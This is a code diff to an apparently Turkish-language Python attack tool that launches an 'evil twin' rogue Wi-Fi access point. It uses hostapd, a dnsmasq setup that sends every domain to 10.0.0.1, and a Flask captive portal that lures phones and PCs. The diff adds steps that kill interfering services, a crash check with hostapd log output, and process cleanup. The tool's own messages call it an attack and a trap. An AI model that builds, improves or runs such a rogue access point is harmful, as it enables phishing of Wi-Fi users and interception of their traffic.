@@ -90,8 +90,15 @@ def start_evil_twin(iface, ssid, channel):
     # 1. Ortamı temizle
     cleanup()
     
-    # 2. NetworkManager'ı kapat, IP ataması yap
+    # 2. NetworkManager ve engelleyici servisleri kapat
     os.system("systemctl stop NetworkManager 2>/dev/null")
+    os.system("killall wpa_supplicant 2>/dev/null")
+    os.system("rfkill unblock wifi")
+    time.sleep(1)
+    
+    # Ağ kartını sıfırla ve IP ataması yap
+    os.system(f"ifconfig {iface} down")
+    os.system(f"iwconfig {iface} mode managed 2>/dev/null")
     os.system(f"ifconfig {iface} 10.0.0.1 netmask 255.255.255.0 up")
     
     # 2.5 Iptables Yönlendirmeleri (Tüm trafiği port 80'e at)
@@ -125,8 +132,19 @@ address=/#/10.0.0.1
         f.write(dnsmasq_conf)
         
     print("    [*] Fake Erişim Noktası (AP) başlatılıyor...")
-    ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(2)
+    ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=open("/tmp/hostapd.log", "w"), stderr=subprocess.STDOUT)
+    time.sleep(2.5)
+    
+    # Eğer hostapd hemen çöktüyse kullanıcıyı uyar (Büyük ihtimal adaptör Master mod desteklemiyordur veya takılıdır)
+    if ap_proc.poll() is not None:
+        print(f"\n    \033[91m[!] KRİTİK HATA: Sahte Wi-Fi ağı oluşturulamadı!\033[0m")
+        print("    [*] Bunun en yaygın iki sebebi şunlardır:")
+        print("        1. Wi-Fi adaptörünüz (veya sürücünüz) AP (Master) / Hotspot modunu desteklemiyor olabilir.")
+        print("        2. Adaptör şu anda başka bir işlem tarafından kilitlenmiş olabilir.")
+        print(f"\n    [Detaylı Hata Logu - /tmp/hostapd.log]:")
+        os.system("cat /tmp/hostapd.log | grep -i error")
+        cleanup()
+        return
     
     print("    [*] DNS ve DHCP Yönlendirme Sunucusu başlatılıyor...")
     dns_proc = subprocess.Popen(["dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -138,6 +156,7 @@ address=/#/10.0.0.1
     
     print(f"\n    [\033[92m✔\033[0m] EVIL TWIN AKTİF!")
     print(f"    [*] Ağ Adı: {ssid} başlatıldı.")
+    print(f"    [*] Lütfen telefonunuzun Wi-Fi listesini yenileyin, ağ görünecektir.")
     print(f"    [*] Cihazlar (Telefon/PC) tuzağa bağlandığında, Android/iOS otomatik portal pop-up çıkaracaktır.")
     print("    [*] Bekleniyor...")
     print("    [*] (Saldırıyı durdurmak için CTRL+C yapın)")
@@ -164,4 +183,6 @@ address=/#/10.0.0.1
         print("\n    [!] Saldırı Sonlandırılıyor...")
     finally:
         flask_proc.terminate()
+        ap_proc.terminate()
+        dns_proc.terminate()
         cleanup()
